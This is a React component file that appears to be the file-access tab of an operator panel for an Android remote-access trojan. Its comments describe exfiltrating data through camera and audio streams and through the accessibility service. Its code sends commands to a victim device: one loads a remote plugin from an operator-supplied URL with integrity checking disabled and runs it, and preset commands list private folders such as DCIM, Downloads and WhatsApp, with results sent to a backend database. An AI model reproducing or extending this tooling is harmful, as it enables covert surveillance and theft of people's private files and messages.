import { useState } from 'react';
import { api } from '../../lib/api';
import { Card, C } from './shared';

// The APK source has no dedicated file manager commands (GET_FILES, LIST_FILES etc).
// File access is achieved via:
//   1. The accessibility service reading file paths from screen content
//   2. Exfiltrating via CAMERA_FRAME/AUDIO_CHUNK data streams
//   3. Plugin system (LOAD_PLUGIN + EXEC_PLUGIN with a custom file plugin)
// This tab provides plugin-based file access and shows any received file data.

const QUICK_CMDS = [
  { label: 'List /sdcard',    cmd: { action: 'EXEC_PLUGIN', pluginId: 'filemanager', pluginAction: 'list', path: '/sdcard' } },
  { label: 'List Downloads',  cmd: { action: 'EXEC_PLUGIN', pluginId: 'filemanager', pluginAction: 'list', path: '/sdcard/Download' } },
  { label: 'List DCIM',       cmd: { action: 'EXEC_PLUGIN', pluginId: 'filemanager', pluginAction: 'list', path: '/sdcard/DCIM' } },
  { label: 'List WhatsApp',   cmd: { action: 'EXEC_PLUGIN', pluginId: 'filemanager', pluginAction: 'list', path: '/sdcard/WhatsApp' } },
];

export default function FilesTab({ device }) {
  const [pluginUrl, setPluginUrl]  = useState('');
  const [pluginId,  setPluginId]   = useState('filemanager');
  const [className, setClassName]  = useState('');
  const [status,    setStatus]     = useState('');

  async function sendCmd(params) {
    setStatus('');
    try {
      const r = await api.sendCommand(device.id, params.action, params);
      setStatus(`Sent (${r.status}) — result streams back via device_data`);
    } catch (e) { setStatus('Error: ' + e.message); }
  }

  async function loadPlugin(e) {
    e.preventDefault();
    if (!pluginUrl || !pluginId || !className) return;
    await sendCmd({ action: 'LOAD_PLUGIN', url: pluginUrl, pluginId, className, sha256: null });
  }

  return (
    <div>
      <Card title="File Access via Plugin">
        <div style={{ fontSize: 11, color: '#444', marginBottom: 12, padding: '8px 10px',
          background: '#0d0d12', borderRadius: 4, border: '1px solid #1a1a26', lineHeight: 1.6 }}>
          The APK has no built-in file manager command. File access requires loading a plugin
          via <code style={{ color: '#00d26a', fontSize: 11 }}>LOAD_PLUGIN</code> first, then
          executing with <code style={{ color: '#00d26a', fontSize: 11 }}>EXEC_PLUGIN</code>.
          Alternatively use the Screen Reader to read file lists visible on screen.
        </div>

        <form onSubmit={loadPlugin}>
          <div style={{ display: 'grid', gap: 8, marginBottom: 10 }}>
            <input value={pluginUrl} onChange={e => setPluginUrl(e.target.value)}
              placeholder="Plugin URL (https://...)"
              style={inp} />
            <div style={{ display: 'flex', gap: 8 }}>
              <input value={pluginId} onChange={e => setPluginId(e.target.value)}
                placeholder="Plugin ID" style={{ ...inp, flex: 1 }} />
              <input value={className} onChange={e => setClassName(e.target.value)}
                placeholder="Class name" style={{ ...inp, flex: 2 }} />
            </div>
          </div>
          <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
            <button type="submit"
              style={{ padding: '7px 14px', background: '#00613a', border: 'none',
                borderRadius: 5, color: '#fff', fontSize: 12, cursor: 'pointer', fontFamily: 'inherit' }}>
              🔌 Load Plugin
            </button>
            <button type="button"
              onClick={() => sendCmd({ action: 'LIST_PLUGINS' })}
              style={{ padding: '7px 14px', background: 'none', border: '1px solid #1e1e2a',
                borderRadius: 5, color: '#666', fontSize: 12, cursor: 'pointer', fontFamily: 'inherit' }}>
              📋 List Plugins
            </button>
            <button type="button"
              onClick={() => sendCmd({ action: 'UNLOAD_PLUGIN', pluginId })}
              style={{ padding: '7px 14px', background: 'none', border: '1px solid #3a1515',
                borderRadius: 5, color: '#f44', fontSize: 12, cursor: 'pointer', fontFamily: 'inherit' }}>
              ✕ Unload
            </button>
          </div>
        </form>
      </Card>

      <Card title="Quick Plugin File Commands">
        <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
          {QUICK_CMDS.map(q => (
            <button key={q.label} onClick={() => sendCmd(q.cmd)}
              style={{ padding: '6px 12px', background: 'none', border: '1px solid #1e1e2a',
                borderRadius: 5, color: '#888', fontSize: 12, cursor: 'pointer', fontFamily: 'inherit' }}>
              {q.label}
            </button>
          ))}
        </div>
        {status && (
          <div style={{ marginTop: 10, fontSize: 11, color: '#00d26a', padding: '6px 8px',
            background: '#001a10', borderRadius: 4 }}>{status}</div>
        )}
        <div style={{ marginTop: 10, fontSize: 11, color: '#333' }}>
          Results stream back as <code style={{ color: '#555' }}>PLUGIN_RESULT</code> device_data events visible in browser console and backend DB.
        </div>
      </Card>
    </div>
  );
}

const inp = {
  width: '100%', padding: '8px 11px', background: '#0a0a0f',
  border: '1px solid #1e1e2a', borderRadius: 5, color: '#ddd',
  fontSize: 12, outline: 'none', fontFamily: 'monospace',
  boxSizing: 'border-box',
};
